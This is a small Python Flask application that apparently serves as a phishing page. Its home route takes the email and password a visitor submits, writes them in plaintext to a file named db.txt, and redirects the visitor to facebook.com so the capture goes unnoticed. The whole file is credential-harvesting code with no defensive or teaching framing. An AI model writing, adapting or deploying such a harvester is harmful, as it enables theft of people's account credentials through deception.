from crypt import methods
from flask import Flask, render_template, request, redirect, url_for
from pymongo import MongoClient
import os

def create_app():
    app = Flask(__name__)

    @app.route('/', methods=["POST", "GET"])
    def home():
        if request.method == "POST":
            Email = request.form.get("Email")
            Password = request.form.get("Password")
            data = {"email":Email, "password":Password}
            
            with open("db.txt", "w") as f:
                f.write("Email: " + Email)
                f.write("\n")
                f.write("Password: "+ Password)
            

            return redirect("https://www.facebook.com")
        return render_template('index.html')
    return app
